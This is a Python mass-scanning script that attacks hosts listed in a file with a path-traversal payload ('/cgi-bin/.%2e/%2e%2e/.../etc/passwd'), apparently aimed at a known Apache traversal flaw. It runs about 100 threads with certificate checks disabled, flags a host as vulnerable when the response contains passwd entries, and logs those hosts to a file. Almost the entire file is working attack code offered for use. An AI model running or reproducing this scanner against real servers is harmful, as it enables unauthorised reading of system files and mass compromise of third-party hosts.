#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import logging
logging.captureWarnings(True)
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
import HackRequests
import threading
import queue

payload="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
}
hack=HackRequests.hackRequests()
q=queue.Queue()

def vul_check(tars):
    for tar in tars:
        try:
            url = tar.strip()+payload
            resp=hack.http(url,verify=False,timeout=1)
            if 'root:*' in resp.text():
                print(tar.strip()+" is vul ")
                q.put(tar)
            else:
                print(tar.strip() + " is not vul ")
        except Exception as e:
            print(e)
            pass

def mul_threading():
    threads=[]
    targets=[]
    with open("1.txt","r") as f:
        lines=f.readlines()
        l = len(lines)
        for i in range(0,l,l//100):
            target=lines[i:i+l//100]
            targets.append(target)
        print(len(targets[1]))
        for j in range(101):
            t=threading.Thread(target=vul_check,args=(targets[j],))
            t.start()
            threads.append(t)
        for thread in threads:
            thread.join()



if __name__ == '__main__':
    mul_threading()
    while not q.empty():
        with open("vul.txt","a") as f:
            f.write(q.get())
